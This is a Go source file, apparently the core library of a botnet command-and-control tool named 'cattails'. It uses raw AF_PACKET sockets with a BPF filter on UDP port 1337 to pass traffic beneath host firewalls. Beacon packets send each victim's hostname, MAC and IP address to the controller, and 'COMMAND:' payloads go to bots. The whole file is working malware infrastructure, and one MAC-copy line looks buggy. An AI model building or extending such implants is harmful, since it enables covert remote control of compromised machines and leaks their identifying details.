package cattails

import (
	"bufio"
	"bytes"
	"encoding/hex"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"

	"golang.org/x/net/bpf"
	"golang.org/x/sys/unix"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

var FilterRaw = []bpf.RawInstruction{
	{0x28, 0, 0, 0x0000000c},
	{0x15, 0, 6, 0x000086dd},
	{0x30, 0, 0, 0x00000014},
	{0x15, 0, 15, 0x00000011},
	{0x28, 0, 0, 0x00000036},
	{0x15, 12, 0, 0x00000539},
	{0x28, 0, 0, 0x00000038},
	{0x15, 10, 11, 0x00000539},
	{0x15, 0, 10, 0x00000800},
	{0x30, 0, 0, 0x00000017},
	{0x15, 0, 8, 0x00000011},
	{0x28, 0, 0, 0x00000014},
	{0x45, 6, 0, 0x00001fff},
	{0xb1, 0, 0, 0x0000000e},
	{0x48, 0, 0, 0x0000000e},
	{0x15, 2, 0, 0x00000539},
	{0x48, 0, 0, 0x00000010},
	{0x15, 0, 1, 0x00000539},
	{0x6, 0, 0, 0x00040000},
	{0x6, 0, 0, 0x00000000},
}

// Function to do this err checking repeatedly
func checkEr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

// htons converts a short (uint16) from host-to-network byte order.
// #Stackoverflow
func htons(i uint16) uint16 {
	return (i<<8)&0xff00 | i>>8
}

// ReadPacket reads packets from a socket file descriptor (fd)
//
// fd  	--> file descriptor that relates to the socket created in main
// vm 	--> BPF VM that contains the BPF Program
//
// Returns 	--> None
func ReadPacket(fd int, vm *bpf.VM) gopacket.Packet {

	// Buffer for packet data that is read in
	buf := make([]byte, 1500)

	// Read in the packets
	// num 		--> number of bytes
	// sockaddr --> the sockaddr struct that the packet was read from
	// err 		--> was there an error?
	_, _, err := unix.Recvfrom(fd, buf, 0)

	checkEr(err)

	// Filter packet?
	// numBytes	--> Number of bytes
	// err	--> Error you say?
	numBytes, err := vm.Run(buf)
	checkEr(err)
	if numBytes == 0 {
		// Change "continue" to return for routine logic
		return nil // 0 means that the packet should be dropped
		// Here we are just "ignoring" the packet and moving on to the next one
	}

	// Parse packet... hopefully
	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
		// Make sure this is my packet
		if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO:") {
			return packet
		}
		return nil
	}
	return nil
}

// CreateAddrStruct creates a "syscall.ScokaddrLinklayer" struct used
//	for binding the socket to an interface
//
// ifaceInfo	--> net.Interface pointer
//
// Returns		--> syscall.SockaddrLinklayer struct
func CreateAddrStruct(ifaceInfo *net.Interface) (addr unix.SockaddrLinklayer) {
	// Create a byte array for the MAC Addr
	var haddr [8]byte

	// Copy the MAC from the interface struct in the new array
	copy(haddr[0:7], ifaceInfo.HardwareAddr[0:7])

	// Initialize the Sockaddr struct
	addr = unix.SockaddrLinklayer{
		Protocol: unix.ETH_P_IP,
		Ifindex:  ifaceInfo.Index,
		Halen:    uint8(len(ifaceInfo.HardwareAddr)),
		Addr:     haddr,
	}

	return addr
}

// SendPacket sends a packet using a provided
//	socket file descriptor (fd)
//
// fd 			--> The file descriptor for the socket to use
// ifaceInfo	--> pointer to net.Interface struct
// addr			--> struct from CreateAddrStruct()
// packetdata	--> The packet to send
//
// Returns 	--> None
func SendPacket(fd int, ifaceInfo *net.Interface, addr unix.SockaddrLinklayer, packetData []byte) {

	// Bind the socket
	checkEr(unix.Bind(fd, &addr))

	_, err := unix.Write(fd, packetData)
	checkEr(err)
}

// CreatePacket takes a net.Interface pointer to access
// 	things like the MAC Address... and yeah... the MAC Address
//
// ifaceInfo	--> pointer to a net.Interface
//
// Returns		--> Byte array that is a properly formed/serialized packet
func CreatePacket(ifaceInfo *net.Interface, srcIp net.IP,
	dstIP net.IP, dstMAC net.HardwareAddr, payload string) (packetData []byte) {

	// Used for generating random source port
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)

	// Buffer to building our packet
	buf := gopacket.NewSerializeBuffer()

	// Generate options
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	// Ethernet layer
	ethernet := &layers.Ethernet{
		EthernetType: layers.EthernetTypeIPv4,
		SrcMAC:       ifaceInfo.HardwareAddr,
		DstMAC:       dstMAC,
	}
	// IPv4 layer
	ip := &layers.IPv4{
		Version:    0x4,
		IHL:        5,
		TTL:        255,
		Flags:      0x40,
		FragOffset: 0,
		Protocol:   unix.IPPROTO_UDP, // Sending a UDP Packet
		DstIP:      dstIP,            //net.IPv4(),
		SrcIP:      srcIp,            //net.IPv4(),
	}
	// UDP layer
	udp := &layers.UDP{
		SrcPort: layers.UDPPort(r1.Intn(65535)), // Random ports baby
		DstPort: layers.UDPPort(1337),           // Saw this used in some code @github... seems legit
	}

	// Checksum calculations
	udp.SetNetworkLayerForChecksum(ip)

	checkEr(gopacket.SerializeLayers(buf, opts, ethernet, ip, udp, gopacket.Payload(payload)))

	// Save the newly formed packet and return it
	packetData = buf.Bytes()

	return packetData
}

// CreateBPFVM creates a BPF VM that contains a BPF program
// 	given by the user in the form of "[]bpf.RawInstruction".
// You can create this by using "tcpdump -dd [your filter here]"
//
// filter	--> Raw BPF instructions generated from tcpdump
//
// Returns	--> Pointer to a BPF VM containing the filter/program
func CreateBPFVM(filter []bpf.RawInstruction) (vm *bpf.VM) {

	// Disassemble the raw instructions so we can pass them to a VM
	insts, allDecoded := bpf.Disassemble(filter)
	if allDecoded != true {
		log.Fatal("Error decoding BPF instructions...")
	}

	vm, err := bpf.NewVM(insts)
	checkEr(err)

	return vm
}

// NewSocket creates a new RAW socket and returns the file descriptor
//
// Returns --> File descriptor for the raw socket
func NewSocket() (fd int) {

	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(htons(unix.ETH_P_ALL)))
	checkEr(err)

	return fd
}

// GetOutboundIP finds the outbound IP addr for the machine
//
// addr		--> The IP you want to be able to reach from an interface
//
// Returns	--> IP address in form "XXX.XXX.XXX.XXX"
func getOutboundIP(addr string) net.IP {
	conn, err := net.Dial("udp", addr)
	checkEr(err)

	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}

// GetOutwardIface determines the interface associated with
// sending traffic out on the wire and returns a *net.Interface struct
//
// addr		--> The IP you want to be able to reach from an interface
//
// Returns	--> *net.Interface struct of outward interface
//			--> net.IP used for creating a packet
func GetOutwardIface(addr string) (byNameiface *net.Interface, ip net.IP) {
	outboundIP := getOutboundIP(addr)

	ifaces, err := net.Interfaces()
	checkEr(err)

	for _, i := range ifaces {

		byNameiface, err := net.InterfaceByName(i.Name)
		checkEr(err)

		addrs, _ := byNameiface.Addrs()

		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if bytes.Compare(outboundIP, ipnet.IP.To4()) == 0 {
					ip := ipnet.IP.To4()
					return byNameiface, ip
				}
			}
		}
	}

	return
}

// GetRouterMAC gets the default gateway MAC addr from the system
//
// Returns 	--> MAC addr of the gateway of type net.HardwareAddr
//
// Credit: Milkshak3s & Cictrone
func GetRouterMAC() (net.HardwareAddr, error) {
	// get the default gateway address from routes
	gatewayAddr := ""
	fRoute, err := os.Open("/proc/net/route")
	if err != nil {
		return nil, err
	}
	defer fRoute.Close()

	s := bufio.NewScanner(fRoute)
	s.Scan()

	for s.Scan() {
		line := s.Text()
		fields := strings.Fields(line)
		if fields[1] == "00000000" {
			decode, err := hex.DecodeString(fields[2])
			if err != nil {
				return nil, err
			}

			gatewayAddr = fmt.Sprintf("%v.%v.%v.%v", decode[3], decode[2], decode[1], decode[0])
		}
	}

	if gatewayAddr == "" {
		return nil, errors.New("no gateway found in routes")
	}

	// look through arp tables for match to gateway address
	fArp, err := os.Open("/proc/net/arp")
	if err != nil {
		return nil, err
	}
	defer fArp.Close()

	s = bufio.NewScanner(fArp)
	s.Scan()

	for s.Scan() {
		line := s.Text()
		fields := strings.Fields(line)
		if fields[0] == gatewayAddr {
			return net.ParseMAC(fields[3])
		}
	}

	return nil, errors.New("no gateway found")
}

// CreateHello creates a HELLO string for callbacks
// HELLO format:
//
//	HELLO: hostname hostMAC hostIP
//
//	*NOTE* hostMAC and hostIP will end up being the MAC/IP of the gateway
//			we are dealing with NAT. This will be handled by the C2 parsing
func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
	hostname, err := os.Hostname()
	if err != nil {
		log.Fatal("Hostname not found...")
	}

	hello = "HELLO:" + " " + hostname + " " + hostMAC.String() + " " + srcIP.String()

	return hello
}

// CreateCommand creates the payload for sending commands to bots
func CreateCommand(cmd string) (command string) {
	command = "COMMAND: " + cmd
	return command
}
